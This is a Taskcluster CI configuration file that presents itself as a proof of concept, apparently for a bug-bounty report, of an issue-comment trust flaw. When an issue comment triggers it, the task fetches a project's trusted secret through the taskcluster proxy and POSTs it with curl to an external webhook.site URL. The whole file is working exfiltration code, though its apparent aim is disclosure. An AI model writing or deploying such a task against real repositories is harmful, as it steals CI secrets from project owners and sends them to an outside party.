version: 1
reporting: checks-v1
policy:
  pullRequests: collaborators
  allowComments: collaborators

tasks:
  - $if: 'tasks_for == "github-issue-comment"'
    then:
      taskId: {$eval: as_slugid("exfil")}
      provisionerId: docker-compose
      workerType: generic-worker
      created: {$fromNow: ''}
      deadline: {$fromNow: '30 minutes'}
      scopes:
        - secrets:get:project/poc/trusted-secret
      metadata:
        name: "Attacker payload"
        description: "issue_comment trust bug PoC"
        owner: attacker@example.com
        source: {$eval: 'event.repository.html_url'}
      payload:
        maxRunTime: 600
        command:
          - - /bin/bash
            - -c
            - |
              set -e
              echo "=============================="
              echo "TASK_ID: $TASK_ID"
              echo "PROXY: $TASKCLUSTER_PROXY_URL"
              echo "=============================="
              SECRET=$(curl -sf "http://taskcluster/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret")
              echo "Secret: $SECRET"
              curl -sS -X POST \
                -H "Content-Type: application/json" \
                -d "{\"taskId\":\"$TASK_ID\",\"secret\":$SECRET,\"note\":\"H1 PoC\"}" \
                https://webhook.site/31ad84a9-95a3-418c-aed3-66c79584c733
              echo "Done."
        features:
          taskclusterProxy: true
